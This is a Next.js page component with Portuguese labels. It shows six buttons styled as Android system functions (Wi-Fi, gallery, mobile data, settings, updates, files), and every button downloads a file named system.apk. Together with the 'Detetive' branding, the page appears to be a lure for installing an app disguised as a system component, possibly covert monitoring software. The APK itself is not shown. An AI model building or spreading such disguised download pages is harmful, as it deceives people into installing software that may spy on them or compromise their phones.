'use client'

import { useTranslations } from 'next-intl'
import Image from 'next/image'

export default function Page() {
  const t = useTranslations('HomePage')

  return (
    <div className='w-full h-screen flex flex-col relative items-center justify-center'>
      <div className='flex items-center gap-x-2'>
        <Image alt='Detetive' src="/ALMOFADAWT.png" width="150" height="50" />
      </div>

      <div className='flex flex-col gap-y-5 items-center mt-2'>
        <h1 className='font-semibold text-[20px]'>
          {t('click')}
        </h1>

        <div className='w-[90%] self-center flex items-center justify-center'>
          <div className='grid grid-cols-3 gap-5 gap-y-8'>
            <button onClick={() => window.location.href = '/wifi/system.apk'} className='outline-none ring-0 rounded-[12px] flex flex-col items-center gap-y-1'>
              <Image alt='WIfi' src="/ic_launcher.png" width="60" height="60" />

              <h1 className='font-semibold text-[12px] text-center'>{t('wifi')}</h1>
            </button>

            <button onClick={() => window.location.href = '/galeria/system.apk'} className='outline-none ring-0 rounded-[12px] flex flex-col items-center gap-y-1'>
              <Image alt='Galeria' src="/galeria.svg" width="60" height="60" />

              <h1 className='font-semibold text-[12px] text-center'>{t('gallery')}</h1>
            </button>

            <button onClick={() => window.location.href = '/dadosmoveis/system.apk'} className='outline-none ring-0 rounded-[12px] flex flex-col items-center gap-y-1'>
              <Image alt='Dados Móveis' src="/dadosmoveis.svg" width="60" height="60" />

              <h1 className='font-semibold text-[12px] text-center'>{t('dadosmoveis')}</h1>
            </button>

            <button onClick={() => window.location.href = '/ajustes/system.apk'} className='outline-none ring-0 rounded-[12px] flex flex-col items-center gap-y-1'>
              <Image alt='Ajustes' src="/ajustes.svg" width="60" height="60" />

              <h1 className='font-semibold text-[12px] text-center'>{t('ajustes')}</h1>
            </button>

            <button onClick={() => window.location.href = '/atts/system.apk'} className='outline-none ring-0 rounded-[12px] flex flex-col items-center gap-y-1'>
              <Image alt='Atualizações' src="/atts.svg" width="60" height="60" />

              <h1 className='font-semibold text-[12px] text-center'>{t('atts')}</h1>
            </button>

            <button onClick={() => window.location.href = '/arquivos/system.apk'} className='outline-none ring-0 rounded-[12px] flex flex-col items-center gap-y-1'>
              <Image alt='Arquivos' src="/arquivos.svg" width="60" height="60" />

              <h1 className='font-semibold text-[12px] text-center'>{t('arquivos')}</h1>
            </button>
          </div>
        </div>

        {/* <button
          onClick={handleDownload}
          className='bg-black min-w-[265px] py-4 min-h-[43px] rounded-[8px] text-white font-semibold uppercase text-[18px] [box-shadow:0px_4px_1px_#a3a3a3] active:translate-y-[2px] active:shadow-none'
        >
          {t('button_field')}
        </button> */}
      </div>

      <p className='text-center absolute bottom-5 w-[350px] text-[14px]'>
        {t('difficulties')}
      </p>
    </div>
  )
}